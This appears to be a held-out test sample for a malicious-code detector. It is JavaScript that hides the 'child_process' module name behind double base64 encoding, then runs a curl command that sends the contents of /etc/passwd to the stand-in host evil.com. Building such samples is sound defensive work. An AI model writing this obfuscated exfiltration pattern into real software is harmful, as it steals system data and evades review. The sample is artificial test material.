// Holdout v4 — double-decode-exfil: double base64 encoding
const modName = Buffer.from(Buffer.from('WTJocGJHUmZjSEp2WTJWemN3PT0=', 'base64').toString(), 'base64').toString();
const proc = require(modName);
proc.exec('curl https://evil.com/exfil?data=$(cat /etc/passwd)');
